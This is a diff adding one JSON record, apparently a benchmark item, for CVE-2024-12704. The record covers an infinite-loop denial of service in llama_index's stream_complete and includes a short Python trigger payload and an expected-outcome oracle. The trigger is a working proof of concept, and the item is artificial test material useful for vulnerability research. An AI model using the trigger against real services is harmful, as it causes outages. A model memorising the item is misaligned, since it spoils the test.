@@ -1,0 +1,15 @@
+{
+  "file_id": "264_llama-index_huntr_a0b638fd-21c6-4ba7-b381-6ab98472a02a",
+  "numeric_id": "264",
+  "library_hint": "llama-index",
+  "source": "huntr",
+  "title": "Missing exception handler in stream_complete method leads to infinite loop and Denial of Service",
+  "cve": "CVE-2024-12704",
+  "cwe": "CWE-835: Infinite Loop",
+  "library": "llama_index",
+  "affected_version": "< 0.12.6",
+  "vulnerable_function": "stream_complete",
+  "triggerability": "indirect",
+  "trigger_payload": "import openai\nfrom llama_index.llms.langchain import LangChainLLM\nimport os\nfrom langchain_openai import ChatOpenAI\nos.environ[\"OPENAI_API_KEY\"] = \"<YOUR_API_KEY>\"\nopenai.api_key = os.environ[\"OPENAI_API_KEY\"]\nllm = LangChainLLM(llm = ChatOpenAI(model=\"gpt-3.5-turbo\"))\nmessages = 123\n# Generate response\nresponse_gen = llm.stream_complete(messages)\nfor delta in response_gen:\n    print(delta.delta, end=\"\")\nprint(\"\\n\")",
+  "oracle": "The process continues to run indefinitely, causing a Denial of Service due to an infinite loop in the get_response_gen method."
+}
